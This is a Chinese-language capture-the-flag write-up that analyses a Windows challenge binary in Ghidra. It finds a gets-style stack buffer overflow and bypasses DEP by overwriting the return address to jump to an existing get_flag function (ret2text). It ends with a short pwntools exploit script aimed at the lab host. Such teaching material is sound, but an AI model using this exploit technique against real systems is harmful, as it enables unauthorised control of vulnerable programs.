# 系统层漏洞利用与逆向分析-DEP数据执行保护利用-G1 WriteUp

题目提供了一个运行在靶机 `172.17.159.230:9999` 上的 Windows 可执行文件 `challenge.exe`，要求找到程序中的漏洞并劫持控制流，触发 `get_flag()` 函数获取一次性凭证，再用凭证到 flag 容器兑换 flag。

首先将 `challenge.exe` 导入 Ghidra 进行静态分析。Ghidra 识别出这是一个 32 位 x86 PE 文件（`x86:LE:32:default`）。通过查看程序的导出入口点，发现了两个关键的导出函数：`get_flag` 位于地址 `0x00401000`，`vuln` 位于地址 `0x00401020`，程序入口 `entry` 位于 `0x00401394`。

![image.png](https://k13in-images.oss-cn-wuhan-lr.aliyuncs.com/20260824135910164.png)

对 `get_flag` 函数进行反编译，Ghidra 给出的伪代码如下：

```c
void get_flag(void)
{
    GetFlag();
    ExitProcess(0);
}
```

这个函数非常简单，调用 `GetFlag()`（来自 `getflag.dll`）获取凭证并输出，然后退出进程。这就是我们需要劫持控制流跳转到的目标函数。

接下来反编译 `vuln` 函数，Ghidra 给出的伪代码如下：

![image.png](https://k13in-images.oss-cn-wuhan-lr.aliyuncs.com/20260824140057053.png)


```c
void vuln(void)
{
    undefined1 local_44 [64];

    FUN_00401110(0x41d000);
    FUN_004063d5(local_44);
    FUN_00401110(0x41d008);
    return;
}
```

通过查看字符串表，地址 `0x41d000` 处的字符串是 `"Input: "`，所以 `FUN_00401110` 是一个输出函数（类似 `printf`）。`FUN_004063d5` 则是读取用户输入到 `local_44` 缓冲区中。继续跟进 `FUN_004063d5`，其伪代码为：

```c
void __cdecl FUN_004063d5(undefined1 *param_1)
{
    FUN_00406272(param_1, -1, '\x01');
    return;
}
```

它将第二个参数传为 `-1`，进入 `FUN_00406272`。这个函数的伪代码较长，其核心逻辑为：

```c
undefined1 * __cdecl FUN_00406272(undefined1 *param_1, int param_2, char param_3)
{
    // ... 省略初始化和错误检查 ...

    if (param_2 == -1) {
        while ((iVar6 != 10 && (iVar6 != -1))) {
            *param_1 = (char)iVar6;
            param_1 = param_1 + 1;
            pFVar4 = (FILE *)FUN_004041d8(0);
            iVar6 = FUN_0040a397(pFVar4);
        }
        *param_1 = 0;
    }
    // ... 省略 param_2 != -1 的分支 ...
}
```

当 `param_2 == -1` 时，函数进入一个循环，从标准输入逐字节读取字符，直到遇到换行符（ASCII 10）或 EOF（-1），期间不做任何长度检查。这与 `gets()` 的行为完全一致。将上述 Ghidra 伪代码还原为人类易读的代码后，`vuln` 函数等价于：

```c
void vuln(void)
{
    char buf[64];
    printf("Input: ");
    gets(buf);
    printf("Echo: %s\n", buf);
}
```

漏洞已经很清楚了：64 字节的栈缓冲区配合无边界检查的 `gets` 读取，构成经典的栈缓冲区溢出。

接下来查看 `vuln` 的汇编代码来确认栈帧布局：

![image.png](https://k13in-images.oss-cn-wuhan-lr.aliyuncs.com/20260824140241901.png)

```asm
00401020  PUSH EBP
00401021  MOV EBP,ESP
00401023  SUB ESP,0x40
00401033  LEA EAX,[EBP + -0x40]
00401036  PUSH EAX
00401037  CALL FUN_004063d5
...
00401050  MOV ESP,EBP
00401052  POP EBP
00401053  RET
```

`SUB ESP, 0x40` 分配了 64 字节（`0x40`）的栈空间，缓冲区起始地址为 `EBP - 0x40`。标准的 x86 栈帧布局为：低地址到高地址依次是缓冲区（64 字节）、保存的 EBP（4 字节）、返回地址（4 字节）。因此从缓冲区起始位置到返回地址的偏移为 `0x40 + 4 = 68` 字节。

由于程序启用了 DEP（数据执行保护），栈和数据段被标记为不可执行，传统的在栈上注入 shellcode 并跳转执行的方式会触发异常而失败。但 DEP 只阻止从数据页执行代码，并不阻止从合法的代码段执行代码。`get_flag` 函数位于 `.text` 段（地址范围 `0x00401000 - 0x004157ff`，具有可执行权限），属于程序自身的合法代码。因此利用思路是通过栈溢出覆盖返回地址，将控制流重定向到已有的 `get_flag` 函数（ret2text），绕过 DEP 的限制。

构造 payload 的逻辑：前 68 字节为任意填充（覆盖缓冲区和 saved EBP），紧接着 4 字节为 `get_flag` 的地址（小端序 `\x00\x10\x40\x00`）。使用 pwntools 编写利用脚本：

```python
from pwn import *

r = remote("172.17.159.230", 9999)
r.recvuntil(b"Input:")

get_flag = 0x00401000
payload = b"A" * 68 + p32(get_flag)

r.sendline(payload)
r.interactive()
```

运行脚本后，程序的 `vuln` 函数在执行 `RET` 指令时，从栈上弹出的返回地址已被覆盖为 `0x00401000`，控制流跳转到 `get_flag`，成功输出一次性凭证 token：

![exploit.png](https://k13in-images.oss-cn-wuhan-lr.aliyuncs.com/exploit.png)

将获取到的 token 通过 curl 发送到 flag 兑换服务，最终获取 flag：

![get_flag.png](https://k13in-images.oss-cn-wuhan-lr.aliyuncs.com/get_flag.png)
